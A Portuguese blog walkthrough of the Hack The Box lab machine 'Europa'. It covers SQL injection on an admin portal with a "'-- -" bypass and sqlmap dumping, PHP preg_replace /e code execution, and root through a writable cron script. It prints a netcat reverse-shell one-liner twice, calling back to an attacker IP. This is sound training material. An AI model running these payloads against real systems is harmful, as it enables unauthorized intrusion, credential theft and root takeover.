---
title: "Hack The Box - Europa"
tags: [Linux,Medium,Pspy,Cronjob,BurpSuite,SQLInjection,Web]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/27>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas no servidor

> Porta 22 -> Servidor SSH, dificilmente a exploração vai ser por aqui

> Portas 80 e 443 -> Servidor Web.

O que chamou atenção foi o DNS que ele encontrou pra `admin-portal.europacorp.htb`

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_web.png)

## Enumeração da porta 443

Abrimos o browser no endereço e encontramos a segunte página https

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_web1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_web2.png)

Sempre é bom analizarmos o certificado quando vemos https, verificando ele, encontramos o seguinte domínio

> europacorp.htb

Ao aceitarmos o Certificado, a página é igual a http

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_web3.png)

### Editando /etc/hosts

Bom, como não encontramos nada até agora, vamos editar o /etc/hosts com os dois domínio que encontramos, pra ver se nos redirecionam para sites diferentes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_hosts.png)

## admin-portal.europacorp.htb

Ao acessarmos o link `admin-portal.europacorp.htb` encontramos uma página interessante (Acesso no HTTPS, no HTTP não tem nada)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_admin.png)

Bom, depois de dar uma olhada, pesquisar por exploits, sem sucesso. Resolvi enviar essa requisição para o BurpSuite e ver como poderiamos trabalhar com ele.

Se lembrar bem, lá em cima, quando vimos e certificado do HTTPS ele tinha um endereço de e-mail, esse aqui da imagem

> E = admin@europacorp.htb

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_admin1.png)

### BurpSuite

Enviamos a requsição de login para o `BurpSuite`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_burp1.png)

Enviamos para o `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_burp2.png)

#### SQLInjection

Faremos de dois modos, no braço e pelo sqlmap

##### No braço

Após vários testes na página, encontramos um ponto de `sqlinjection` nela, que após o endereço de e-mail comentamos com `'-- -` temos acesso à página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_burp3.png)

Follow Redirection

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_burp4.png)

Acessando o site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_burp5.png)

##### SQLMap

Caso você tenha preguiça, ou simplesmente seja vagabundo a ponto de não querer fazer as coisas não mão, pode usar o sqlmap

Primeiro salva a requisição para um arquivo, clicando com o direito indo em *Copy to File*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_sqlmap.png)

Após isso a requisição POST do login vai estar salva em um arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_sqlmap1.png)

Agora é só rodar o `sqlmap`

> sqlmap -r login.req --force-ssl

Aqui foi --force-ssl pq a página é https

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_sqlmap2.png)

Após esperarmos um pouco ele realizar o dump da página

Conseguimos hashes

> sqlmap -r login.req --force-ssl --dump

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_sqlmap4.png)

Quebramos ele, e logamos na aplicação sem ser por '-- -'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_sqlmap6.png)

Bom, vamos continuar

# Exploração

Agora com acesso ao painel de admin da aplicação podemos iniciar a nossa exploração

Pesquisando por ela encontramos diversos arquivos de configuração de OVPN

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn.png)

Po, como vamos explorar isso?

Se não sabe, manda pro `BurpSuite` pra melhor verificar o que está acontecendo com a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn2.png)

Mandamos pro `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn3.png)

Como está tudo em URLEncode, retiramos (Seleciona tudo e Control + Shift + U) - Só para ficar mais fácil de trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn4.png)

Enviamos a requisição, pra ver como é a resposta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn5.png)

Verificamos que alguns dados se repetem, na requisição e na response, interessante, já começamos a ver maneiras possíveis de explorar isso

Hum, se mudarmos o parâmetro e enviarmos, ele replica do outro lado. O que parece estar acontecendo é uma regex php ali, dando match com algum determinado filtro ele da a response ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn6.png)

## Explrorando PHP Regex

Bom, tendo essa suspeita, começamos a pesquisar sobre como podemos explorar isso

Show, vamos perguntar pra quem sabe... Google

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_google.png)

> https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

Lendo a parada toda, chegamos a conclusão de adicionar um `/e` ele vai executar o código, simples não?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_google1.png)

Vamos lá então

Testamos e corremos pro abraço! Temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_vpn7.png)

Poderiamos fazer diferente, direto pelo BurpSuite na aba Params

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_params.png)

### Reverse Shell

Agora é só fazer um reverse shell

> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.119 443 >/tmp/f
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_shell.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_shell1.png)

Ganhamos a reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_shell2.png)

# Escalação de Privilégio

Não vou rodar nenhum script de enumeração pq não vai dar resultados satifatórios

Rodarei o PSPY pra ver se tem algum cron sendo executado

## PSPY

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_pspy.png)

Passamos pra máquina e executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_pspy1.png)

Vemos algo na pasta /var/www/cronjobs/clearlogs sendo executado como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_pspy2.png)

Confirmamos isso verificando o arquivo /etc/cron

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_1.png)

### Verificando cronjobs

Entramos na pasta e verificamos que realmente o dono do arquivo é root e ele executa um arquivo localizado em /var/www/cmd/logcleared.sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_cron1.png)

Verificamos ele, modificamos pra nos dar um reverse shell de root

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.119 443 >/tmp/f
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_cron.png)

Ligamos o listener, esperamos e corremos pro abraço!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_cron2.png)

## Pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-europa/E_root.png)